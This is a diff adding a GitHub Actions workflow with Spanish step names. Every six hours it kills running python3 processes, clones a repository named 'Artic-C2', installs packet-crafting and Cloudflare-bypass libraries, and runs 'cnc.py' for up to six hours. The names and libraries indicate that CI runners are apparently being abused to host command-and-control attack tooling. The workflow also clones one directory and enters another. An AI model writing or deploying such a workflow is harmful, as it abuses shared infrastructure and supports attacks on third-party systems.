@@ -1,0 +1,34 @@
+name: Cosmicc
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  avalon-run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+    - name: Limpiar directorio anterior
+      run: |
+        rm -rf Zyno2 2>/dev/null || true
+        sudo killall -9 python3 2>/dev/null || true
+
+    - name: Clonar repositorio
+      run: |
+        git clone https://github.com/anothertest994-a11y/Artic-C2.git || \
+        git clone --depth 1 https://github.com/anothertest994-a11y/Artic-C2.git
+
+    - name: Instalar dependencias
+      run: |
+        sudo apt update -qq
+        sudo apt install -y python3-pip python3-dev
+        pip3 install --upgrade pip setuptools wheel
+        pip3 install requests pysocks pyopenssl cryptography cloudscraper scapy icmplib
+
+    - name: Ejecutar cnc.py
+      run: |
+        cd Zyno2
+        python3 cnc.py
